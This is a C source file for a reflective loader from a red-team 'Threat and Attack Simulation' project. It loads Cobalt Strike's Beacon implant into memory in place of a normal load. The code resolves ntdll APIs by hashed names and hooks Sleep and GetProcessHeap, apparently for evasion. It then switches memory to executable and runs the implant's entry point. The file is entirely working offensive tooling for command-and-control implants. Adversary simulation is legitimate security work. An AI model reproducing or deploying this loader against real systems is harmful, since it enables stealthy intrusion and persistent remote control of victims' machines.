/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

typedef BOOLEAN ( WINAPI * DLLMAIN_T )(
		HMODULE	ImageBase,
		DWORD	Reason,
		LPVOID	Parameter
);

typedef struct
{
	D_API( RtlAnsiStringToUnicodeString );
	D_API( NtAllocateVirtualMemory );
	D_API( NtProtectVirtualMemory );
	D_API( LdrGetProcedureAddress );
	D_API( RtlFreeUnicodeString );
	D_API( RtlInitAnsiString );
	D_API( RtlCreateHeap );
	D_API( LdrLoadDll );
} API, *PAPI;

#define H_API_RTLANSISTRINGTOUNICODESTRING	0x6c606cba /* RtlAnsiStringToUnicodeString */
#define H_API_NTALLOCATEVIRTUALMEMORY		0xf783b8ec /* NtAllocateVirtualMemory */
#define H_API_NTPROTECTVIRTUALMEMORY		0x50e92888 /* NtProtectVirtualMemory */
#define H_API_LDRGETPROCEDUREADDRESS		0xfce76bb6 /* LdrGetProcedureAddress */
#define H_API_RTLFREEUNICODESTRING		0x61b88f97 /* RtlFreeUnicodeString */
#define H_API_RTLINITANSISTRING			0xa0c8436d /* RtlInitAnsiString */
#define H_API_RTLCREATEHEAP				0xe1af6849 /* RtlCreateHeap */
#define H_API_LDRLOADDLL			0x9e456a43 /* LdrLoadDll */
#define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */

#ifndef PTR_TO_HOOK
#define PTR_TO_HOOK( a, b )	U_PTR( U_PTR( a ) + G_SYM( b ) - G_SYM( Hooks ) )
#endif

/*!
 *
 * Purpose:
 *
 * Loads Beacon into memory and executes its 
 * entrypoint.
 *
!*/

D_SEC( B ) VOID WINAPI Titan( VOID ) 
{
	API			Api;

	SIZE_T			Prm = 0;
	SIZE_T			SLn = 0;
	SIZE_T			ILn = 0;
	SIZE_T			Idx = 0;
	SIZE_T			MLn = 0;

	PVOID			Mem = NULL;
	PVOID			Map = NULL;
	DLLMAIN_T		Ent = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;
	PIMAGE_SECTION_HEADER	Sec = NULL;
	PIMAGE_DATA_DIRECTORY	Dir = NULL;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* Initialize API structures */
	Api.NtAllocateVirtualMemory = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTALLOCATEVIRTUALMEMORY );
	Api.NtProtectVirtualMemory  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTPROTECTVIRTUALMEMORY );
	Api.RtlCreateHeap 			= PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATEHEAP );

	/* Setup Image Headers */
	Dos = C_PTR( G_END() );
	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );

	/* Allocate Length For Hooks & Beacon */
	ILn = ( ( ( Nth->OptionalHeader.SizeOfImage ) + 0x1000 - 1 ) &~( 0x1000 - 1 ) );
	SLn = ( ( ( G_END() - G_SYM( Hooks ) ) + 0x1000 - 1 ) &~ ( 0x1000 - 1 ) );
	MLn = ILn + SLn;

	/* Create a page of memory that is marked as R/W */
	if ( NT_SUCCESS( Api.NtAllocateVirtualMemory( NtCurrentProcess(), &Mem, 0, &MLn, MEM_COMMIT, PAGE_READWRITE ) ) ) {
		
		/* Copy hooks over the top */
		__builtin_memcpy( Mem, C_PTR( G_SYM( Hooks ) ), U_PTR( G_END() - G_SYM( Hooks ) ) );

		/* Get pointer to PE Image */
		Map = C_PTR( U_PTR( Mem ) + SLn );

		/* Copy sections over to new mem */
		Sec = IMAGE_FIRST_SECTION( Nth );
		for ( Idx = 0 ; Idx < Nth->FileHeader.NumberOfSections ; ++Idx ) {
			__builtin_memcpy( C_PTR( U_PTR( Map ) + Sec[ Idx ].VirtualAddress ),
					  C_PTR( U_PTR( Dos ) + Sec[ Idx ].PointerToRawData ),
					  Sec[ Idx ].SizeOfRawData );
		};

		/* Get a pointer to the import table */
		Dir = & Nth->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];

		((PDATA) Mem)->hHeap = Api.RtlCreateHeap(HEAP_GROWABLE, NULL, 0, 0, 0, NULL);

		if ( Dir->VirtualAddress ) {
			/* Process Import Table */
			LdrProcessIat( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ) );
			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x36c007a2, PTR_TO_HOOK( Mem, GetProcessHeap_Hook ) );
			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xe07cd7e,  PTR_TO_HOOK( Mem, Sleep_Hook ) );
		};

		/* Get a pointer to the relocation table */
		Dir = & Nth->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];

		if ( Dir->VirtualAddress ) {
			/* Process Relocations */
			LdrProcessRel( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), Nth->OptionalHeader.ImageBase );
		};

		/* Extend to size of PE Section */
		SLn = SLn + Sec->SizeOfRawData;

		/* Change Memory Protection */
		if ( NT_SUCCESS( Api.NtProtectVirtualMemory( NtCurrentProcess(), &Mem, &SLn, PAGE_EXECUTE_READ, &Prm ) ) ) {
			/* Execute EntryPoint */
			Ent = C_PTR( U_PTR( Map ) + Nth->OptionalHeader.AddressOfEntryPoint );
			Ent( G_SYM( Start ), 1, NULL );
			Ent( G_SYM( Start ), 4, NULL );
		};
	};
	return;
};
